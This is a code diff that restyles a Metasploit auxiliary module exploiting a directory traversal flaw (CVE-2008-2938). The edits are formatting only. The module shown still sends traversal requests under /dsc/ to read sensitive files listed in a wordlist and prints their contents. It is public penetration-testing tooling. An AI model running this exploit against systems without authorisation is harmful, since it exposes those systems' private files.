@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,7 +7,6 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Scanner
 
@@ -30,7 +30,7 @@ class MetasploitModule < Msf::Auxiliary
           [ 'CVE', '2008-2938' ],
           [ 'URL', 'http://www.securityfocus.com/archive/1/499926' ],
           [ 'EDB', '17388' ],
-          [ 'BID', '48225' ],
+          [ 'BID', '48225' ]
         ],
       'Author'         => [ 'patrick' ],
       'License'        => MSF_LICENSE,
@@ -42,21 +42,20 @@ class MetasploitModule < Msf::Auxiliary
         Opt::RPORT(8443),
         OptBool.new('SSL', [true, 'Use SSL', true]),
         OptPath.new('SENSITIVE_FILES', [ true, "File containing senstive files, one per line",
-        File.join(Msf::Config.data_directory, "wordlists", "sensitive_files.txt") ]),
-      ], self.class)
+                                         File.join(Msf::Config.data_directory, "wordlists", "sensitive_files.txt") ])
+      ], self.class
+    )
   end
 
   def extract_words(wordfile)
     return [] unless wordfile && File.readable?(wordfile)
     begin
-      words = File.open(wordfile, "rb") do |f|
-        f.read
-      end
+      words = File.open(wordfile, "rb", &:read)
     rescue
       return []
     end
     save_array = words.split(/\r?\n/)
-    return save_array
+    save_array
   end
 
   def find_files(files)
@@ -65,17 +64,18 @@ class MetasploitModule < Msf::Auxiliary
     res = send_request_raw(
       {
         'method'  => 'GET',
-        'uri'     => '/dsc/' + traversal*10 + files, # We know depth is 10
-        }, 25)
-    if (res and res.code == 200)
+        'uri'     => '/dsc/' + traversal * 10 + files, # We know depth is 10
+      }, 25
+    )
+    if res && (res.code == 200)
       print_status("Request may have succeeded on #{rhost}:#{rport}:file->#{files}! Response: \r\n#{res.body}")
       @files_found << files
-    elsif (res and res.code)
+    elsif res && res.code
       vprint_status("Attempt returned HTTP error #{res.code} on #{rhost}:#{rport}:file->#{files}")
     end
   end
 
-  def run_host(ip)
+  def run_host(_ip)
     @files_found = []
 
     begin
@@ -83,16 +83,17 @@ class MetasploitModule < Msf::Auxiliary
       res = send_request_raw(
         {
           'method'  => 'GET',
-          'uri'     => '/dsc/',
-        }, 25)
+          'uri'     => '/dsc/'
+        }, 25
+      )
 
-      if (res)
+      if res
         extract_words(datastore['SENSITIVE_FILES']).each do |files|
           find_files(files) unless files.empty?
         end
       end
 
-      if not @files_found.empty?
+      if !@files_found.empty?
         print_good("File(s) found:")
 
         @files_found.each do |f|
